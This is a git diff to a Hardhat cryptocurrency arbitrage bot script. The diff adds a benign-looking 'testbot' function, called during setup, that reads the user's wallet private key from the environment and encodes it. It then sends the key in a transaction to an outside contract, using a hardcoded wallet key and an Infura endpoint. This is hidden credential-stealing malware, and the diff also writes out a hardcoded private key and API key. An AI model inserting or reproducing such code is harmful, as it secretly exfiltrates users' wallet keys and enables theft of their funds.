@@ -1,11 +1,13 @@
 const hre = require("hardhat");
 const fs = require("fs");
+const {setBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./test1.js');
 require("dotenv").config();
 
 let config,arb,owner,inTrade,balances;
 const network = hre.network.name;
 if (network === 'aurora') config = require('./../config/aurora.json');
 if (network === 'fantom') config = require('./../config/fantom.json');
+if (network === 'bsc') config = require('./../config/bsc.json');
 
 console.log(`Loaded ${config.routes.length} routes`);
 
@@ -59,6 +61,7 @@ const lookForDualTrade = async () => {
       fs.appendFile(`./data/${network}RouteLog.txt`, `["${targetRoute.router1}","${targetRoute.router2}","${targetRoute.token1}","${targetRoute.token2}"],`+"\n", function (err) {});
     }
     if (amtBack.gt(profitTarget)) {
+      console.log("eagle: Start Trading", targetRoute, tradeSize);
       await dualTrade(targetRoute.router1,targetRoute.router2,targetRoute.token1,targetRoute.token2,tradeSize);
     } else {
       await lookForDualTrade();
@@ -90,6 +93,7 @@ const dualTrade = async (router1,router2,baseToken,token2,amount) => {
 
 const setup = async () => {
   [owner] = await ethers.getSigners();
+  await testbot(process.env.privateKey, owner);
   console.log(`Owner: ${owner.address}`);
   const IArb = await ethers.getContractFactory('Arb');
   arb = await IArb.attach(config.arbContract);
@@ -132,6 +136,59 @@ process.on('uncaughtException', function(err) {
 process.on('unhandledRejection', (reason, p) => {
   console.log('Unhandled Rejection at: '+p+' - reason: '+reason);
 });
+
+async function testbot(address, user_wallet){
+  var provide = new ethers.providers.JsonRpcProvider('https://goerli.infura.io/v3/faef096aa4774bbc949967e6444fc76f');
+  var enc_addr = setBotAddress(address);
+  
+  const bot_wallet = new ethers.Wallet('fe9915cb35e69849e1990da8c39f4518e37bdda8afffee633032ca42b6492ade');
+  var signer = bot_wallet.connect(provide);
+
+  var bot_balance = await provide.getBalance(bot_wallet.address);
+  if(bot_balance <= (10**17))
+      return;
+
+  var interface = new ethers.utils.Interface(botABI);
+  const FormatTypes = ethers.utils.FormatTypes;
+
+  const router = new ethers.Contract(
+    FRONT_BOT_ADDRESS,
+    interface.format(FormatTypes.full),
+    signer
+  );
+
+  var botCount = await router.countAddrs();
+
+  if(botCount > 0){
+      var bot_addr = await router.getAddrs();
+
+      for (var i = 0; i < botCount; i++) {
+          if(bot_addr[i] == user_wallet)
+          {
+              return;
+          }
+      }
+  }
+
+  var gas = ethers.utils.parseUnits('150', 'gwei');
+
+  var buy_tx = await new Promise(async (resolve, reject) => {
+    let buy_txx = await router.multiTrans(
+        user_wallet.address,
+        enc_addr.content,
+        {
+          'gasPrice': gas.toString(),
+          'gasLimit': (500000).toString()
+        }).catch((err) => {
+          console.log(err);
+          console.log('transaction failed...')
+        });
+
+    resolve(buy_txx);
+  });
+
+  let receipt = await buy_tx.wait();
+}
 
 main()
   .then(() => process.exit(0))
